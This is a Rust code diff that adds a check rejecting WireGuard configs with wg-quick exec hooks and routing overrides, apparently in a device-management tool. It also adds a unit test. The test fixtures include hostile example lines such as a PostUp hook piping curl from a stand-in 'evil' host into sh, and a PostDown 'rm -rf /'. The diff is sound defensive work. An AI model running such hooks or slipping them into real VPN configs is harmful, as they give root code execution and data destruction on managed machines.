@@ -182,13 +182,48 @@ const OVPN_FORBIDDEN: &[&str] = &[
     "dhcp-option",
 ];
 
-/// Reject an OpenVPN config that carries an exec-hook or routing-override
-/// directive. WireGuard has no script hooks, but `AllowedIPs` can still bridge
-/// the device onto an attacker's network — a `0.0.0.0/0`/`::/0` catch-all is
-/// how a legitimate full-tunnel VPN works, so we allow it but the config is
-/// gated behind the sensitive-corner confirm window (see routes) so it can't
-/// ride ordinary session trust.
+/// `wg-quick(8)` keys that execute shell commands (as root) or rewrite the
+/// routing table. The agent brings a WireGuard profile up with `wg-quick`, so
+/// `PostUp = curl … | sh` is a root-exec primitive on every managed device —
+/// exactly the fleet takeover `OVPN_FORBIDDEN` exists to stop. Matched
+/// case-insensitively, as wg-quick does.
+const WG_FORBIDDEN: &[&str] = &[
+    "preup",
+    "postup",
+    "predown",
+    "postdown",
+    "saveconfig", // rewrites the config file on the device
+    "table",      // routing-table override — the LAN-pivot surface
+];
+
+/// Reject a VPN config that carries an exec-hook or routing-override
+/// directive, for BOTH kinds. OpenVPN: the `up`/`route`/`plugin` family.
+/// WireGuard: the `wg-quick` `PreUp`/`PostUp`/… hooks, which run as root.
+/// `AllowedIPs` can still bridge the device onto an attacker's network — a
+/// `0.0.0.0/0`/`::/0` catch-all is how a legitimate full-tunnel VPN works, so
+/// we allow it but the config is gated behind the sensitive-corner confirm
+/// window (see routes) so it can't ride ordinary session trust. We reject the
+/// config outright rather than strip lines: a partial strip is worse than a
+/// clear no.
 fn reject_dangerous_vpn(config: &str, kind: &str) -> AppResult<()> {
+    if kind == "wireguard" {
+        for raw in config.lines() {
+            let line = raw.trim();
+            if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
+                continue;
+            }
+            // `Key = value` — wg-quick matches keys case-insensitively.
+            let key = line.split('=').next().unwrap_or("").trim().to_ascii_lowercase();
+            if WG_FORBIDDEN.contains(&key.as_str()) {
+                return Err(AppError::BadRequest(format!(
+                    "this WireGuard config uses '{key}', which wg-quick runs as root on the \
+                     device — remove it. OpenScreenTime never delivers a config that can \
+                     execute code on a managed machine."
+                )));
+            }
+        }
+        return Ok(());
+    }
     if kind != "openvpn" {
         return Ok(());
     }
@@ -631,6 +666,28 @@ mod tests {
     use super::*;
 
     const WG: &str = "[Interface]\nPrivateKey = SECRETKEY123=\nAddress = 10.0.0.2/32\n\n[Peer]\nPublicKey = PUB=\nPresharedKey = PSK456=\nEndpoint = vpn.example.com:51820\nAllowedIPs = 0.0.0.0/0";
+
+    #[test]
+    fn rejects_wireguard_exec_hooks() {
+        // wg-quick runs these as ROOT on the device: the exact fleet-RCE the
+        // OpenVPN list guards against, on the other kind.
+        let base = "[Interface]\nPrivateKey = k\nAddress = 10.0.0.2/32\n";
+        for hook in [
+            "PostUp = curl -s https://evil/x | sh",
+            "postup = /bin/sh",
+            "PreUp = touch /pwned",
+            "PostDown = rm -rf /",
+            "PreDown = id",
+            "Table = 1234",
+            "SaveConfig = true",
+        ] {
+            let bad = format!("{base}{hook}\n[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0");
+            assert!(reject_dangerous_vpn(&bad, "wireguard").is_err(), "should reject: {hook}");
+        }
+        // A plain full-tunnel WireGuard config passes.
+        let ok = format!("{base}DNS = 1.1.1.1\n[Peer]\nPublicKey = p\nEndpoint = x:51820\nAllowedIPs = 0.0.0.0/0");
+        assert!(reject_dangerous_vpn(&ok, "wireguard").is_ok());
+    }
 
     #[test]
     fn rejects_openvpn_exec_and_route_directives() {
